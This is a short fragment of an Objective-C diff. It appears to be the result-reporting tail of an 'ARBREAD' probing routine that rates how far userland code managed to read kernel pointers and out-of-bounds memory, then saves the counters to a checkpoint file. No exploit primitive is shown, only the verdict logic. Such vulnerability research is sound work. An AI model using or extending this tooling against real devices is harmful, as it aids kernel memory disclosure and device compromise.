+        else if (directKernelReads > 0) verdict = @"CRITICAL — kernel pointer addresses readable from userland!";
+        else if (addrManipReads > 0) verdict = @"HIGH — address manipulation yields different data";
+        else if (kptrReads > 20) verdict = @"HIGH — massive kernel pointer collection";
+        else if (probeOOBHits > 0) verdict = @"MEDIUM — OOB reads successful";
+        else verdict = @"LOW — no kernel read achieved";
+        log([NSString stringWithFormat:@"ARBREAD: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"sharedMapsCreated": @(sharedMapsCreated),
+            @"probeOOBHits": @(probeOOBHits),
+            @"kptrReads": @(kptrReads),
+            @"addrManipReads": @(addrManipReads),
+            @"directKernelReads": @(directKernelReads),
+            @"kptrDataNonZero": @(kptrDataNonZero)
+        };
+        isr_checkpoint(@"ISR-ArbRead-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
